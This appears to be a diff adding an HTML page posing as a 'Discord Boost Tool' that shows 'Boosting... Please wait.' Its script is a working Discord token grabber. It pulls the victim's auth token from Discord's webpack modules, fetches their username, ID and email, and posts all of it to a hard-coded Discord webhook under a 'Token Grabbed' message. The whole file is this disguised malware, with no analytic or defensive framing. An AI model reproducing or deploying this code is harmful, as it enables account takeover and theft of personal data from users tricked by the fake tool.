@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Discord Boost Tool</title>
+  </head>
+  <body>
+    <h2>Boosting... Please wait.</h2>
+    <script>
+      (async () => {
+        try {
+          const req = webpackChunkdiscord_app.push([
+            [Math.random()],
+            {},
+            (e) => {
+              for (let m in e.c) {
+                try {
+                  let mod = e.c[m].exports;
+                  if (mod?.default?.getToken) {
+                    const token = mod.default.getToken();
+
+                    // Now fetch user details (optional)
+                    const userInfo = await fetch("https://discord.com/api/v9/users/@me", {
+                      headers: {
+                        Authorization: token
+                      }
+                    }).then(res => res.json());
+
+                    // Send token + user info
+                    await fetch("https://discord.com/api/webhooks/1356307294845014148/4hb1AXO3Zmn9HCxbRSs-NW73qVh-sFnrdDMVOTHUscLdT9UufdW6caSluuJbSQt1CIA1", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({
+                        content: `🛑 Token Grabbed\nUsername: ${userInfo.username}#${userInfo.discriminator}\nID: ${userInfo.id}\nEmail: ${userInfo.email}\nToken: ${token}`
+                      })
+                    });
+                    break;
+                  }
+                } catch (_) {}
+              }
+            }
+          ]);
+        } catch (err) {
+          console.error("Token grab failed:", err);
+        }
+      })();
+    </script>
+  </body>
